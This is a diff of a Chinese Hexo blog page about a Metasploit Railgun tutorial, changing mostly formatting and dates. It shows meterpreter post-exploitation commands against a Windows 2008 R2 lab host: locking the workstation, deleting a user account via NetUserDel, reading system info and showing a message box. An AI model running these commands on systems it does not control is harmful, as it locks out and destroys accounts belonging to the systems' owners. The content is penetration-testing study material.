@@ -30,7 +30,7 @@
 <meta property="og:description" content="该文章暂无概述">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-11-23T12:21:00.000Z">
-<meta property="article:modified_time" content="2023-12-12T03:19:37.293Z">
+<meta property="article:modified_time" content="2023-12-17T08:32:28.517Z">
 <meta property="article:author" content="Ghost">
 <meta property="article:tag" content="Metasploit">
 <meta name="twitter:card" content="summary">
@@ -144,7 +144,7 @@
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
             <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%9A%E8%BF%87railgun%E5%9C%A8%E4%B8%80%E4%B8%AA%E6%96%B9%E6%B3%95%E4%B8%AD%E8%B0%83%E7%94%A8%E5%9F%BA%E7%A1%80api"><span class="nav-text">1.
-通过RailGun在一个方法中调用基础API</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B"><span class="nav-text">2. 实例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="nav-text">1、实验环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%94%81%E5%B1%8F%E6%B5%8B%E8%AF%95"><span class="nav-text">2、 锁屏测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A0%E9%99%A4%E6%9F%90%E4%B8%80%E7%94%A8%E6%88%B7"><span class="nav-text">3、删除某一用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"><span class="nav-text">4、 获取系统信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%B9%E6%A1%86%E6%B5%8B%E8%AF%95"><span class="nav-text">5、弹框测试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="nav-text">3. 参考文献</span></a></li></ol></div>
+通过RailGun在一个方法中调用基础API</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B"><span class="nav-text">2. 实例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="nav-text">1、实验环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%94%81%E5%B1%8F%E6%B5%8B%E8%AF%95"><span class="nav-text">2、 锁屏测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A0%E9%99%A4%E6%9F%90%E4%B8%80%E7%94%A8%E6%88%B7"><span class="nav-text">3、删除某一用户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"><span class="nav-text">4、 获取系统信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%B9%E6%A1%86%E6%B5%8B%E8%AF%95"><span class="nav-text">5、弹框测试</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -244,7 +244,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-12-12 11:19:37" itemprop="dateModified" datetime="2023-12-12T11:19:37+08:00">2023-12-12</time>
+      <time title="修改时间：2023-12-17 16:32:28" itemprop="dateModified" datetime="2023-12-17T16:32:28+08:00">2023-12-17</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -263,7 +263,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>384</span>
+      <span>376</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -299,8 +299,7 @@ meterpreter 控制之后方可进行以下测试</strong></p>
 <p><strong>从user32.dll文件中调用的LockWorkStation()函数执行后导致被渗透系统进入了锁定状态</strong></p>
 <p><strong>命令执行前：</strong></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123200936354-270627248.png" /></p>
-<pre><code>**&gt; &gt; railgun.user32.LockWorkStation()
-=&gt; &#123;&quot;GetLastError&quot;=&gt;0, &quot;ErrorMessage&quot;=&gt;&quot;\xB2\xD9\xD7\xF7\xB3\xC9\xB9\xA6\xCD\xEA\xB3\xC9\xA1\xA3&quot;, &quot;return&quot;=&gt;true&#125;**</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; &gt; railgun.user32.LockWorkStation()</span><br><span class="line">=&gt; &#123;<span class="string">&quot;GetLastError&quot;</span>=&gt;0, <span class="string">&quot;ErrorMessage&quot;</span>=&gt;<span class="string">&quot;\xB2\xD9\xD7\xF7\xB3\xC9\xB9\xA6\xCD\xEA\xB3\xC9\xA1\xA3&quot;</span>, <span class="string">&quot;return&quot;</span>=&gt;<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
 <p><strong>结果：</strong></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123201032793-766034225.png" /></p>
 <h3 id="删除某一用户">3、删除某一用户</h3>
@@ -308,28 +307,16 @@ meterpreter 控制之后方可进行以下测试</strong></p>
 <p><strong>从客户的计算机上删除指定的用户。</strong></p>
 <p><strong>删除前存在admin ……和root两个用户，如下图：</strong></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123201233530-389989788.png" /></p>
-<pre><code>meterpreter &gt; irb
-[*] Starting IRB shell...
-[*] You are in the &quot;client&quot; (session) object
-
-irb: warn: can&#39;t alias kill from irb_kill.
-&gt;&gt; railgun.netapi32.NetUserDel(nil,&quot;root&quot;)
-=&gt; &#123;&quot;GetLastError&quot;=&gt;997, &quot;ErrorMessage&quot;=&gt;&quot;FormatMessage failed to retrieve the error.&quot;, &quot;return&quot;=&gt;0&#125;
-&gt;&gt;</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; irb</span><br><span class="line">[*] Starting IRB shell...</span><br><span class="line">[*] You are <span class="keyword">in</span> the <span class="string">&quot;client&quot;</span> (session) object</span><br><span class="line"></span><br><span class="line">irb: warn: can<span class="string">&#x27;t alias kill from irb_kill.</span></span><br><span class="line"><span class="string">&gt;&gt; railgun.netapi32.NetUserDel(nil,&quot;root&quot;)</span></span><br><span class="line"><span class="string">=&gt; &#123;&quot;GetLastError&quot;=&gt;997, &quot;ErrorMessage&quot;=&gt;&quot;FormatMessage failed to retrieve the error.&quot;, &quot;return&quot;=&gt;0&#125;</span></span><br><span class="line"><span class="string">&gt;&gt;</span></span><br></pre></td></tr></table></figure>
 <p><strong>删除后仅剩administrator，如下图：</strong></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123201254370-991738737.png" /></p>
 <p><strong>注意：</strong>
 值nil指明了用户是在局域网中工作。然而，如果系统的目标是在一个不同的网络中，则应该把参数的值设定为目标系统的NET-BIOS值</p>
 <h3 id="获取系统信息">4、 获取系统信息</h3>
-<pre><code>**&gt; &gt; sys.config.sysinfo[&#39;OS&#39;]
-=&gt; &quot;Windows 2008 R2 (Build 7601, Service Pack 1).&quot;**</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; &gt; sys.config.sysinfo[<span class="string">&#x27;OS&#x27;</span>]</span><br><span class="line">=&gt; <span class="string">&quot;Windows 2008 R2 (Build 7601, Service Pack 1).&quot;</span></span><br></pre></td></tr></table></figure>
 <h3 id="弹框测试">5、弹框测试</h3>
-<pre><code>&gt;&gt; railgun.user32.MessageBoxA(0,&#39;hello!&#39;,&#39;pr1s0n&#39;,&#39;MB_OK&#39;)
-=&gt; &#123;&quot;GetLastError&quot;=&gt;0, &quot;ErrorMessage&quot;=&gt;&quot;The operation completed successfully.&quot;, &quot;return&quot;=&gt;1&#125;
-&gt;&gt;</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; railgun.user32.MessageBoxA(0,<span class="string">&#x27;hello!&#x27;</span>,<span class="string">&#x27;pr1s0n&#x27;</span>,<span class="string">&#x27;MB_OK&#x27;</span>)</span><br><span class="line">=&gt; &#123;<span class="string">&quot;GetLastError&quot;</span>=&gt;0, <span class="string">&quot;ErrorMessage&quot;</span>=&gt;<span class="string">&quot;The operation completed successfully.&quot;</span>, <span class="string">&quot;return&quot;</span>=&gt;1&#125;</span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211123201538421-1240460063.png" /></p>
-<h2 id="参考文献">3. 参考文献</h2>
-<p><strong>《精通Metasploit渗透测试》</strong></p>
 
     </div>
 
@@ -407,7 +394,7 @@ irb: warn: can&#39;t alias kill from irb_kill.
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">10:14</span>
+    <span title="站点阅读时长">10:15</span>
   </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
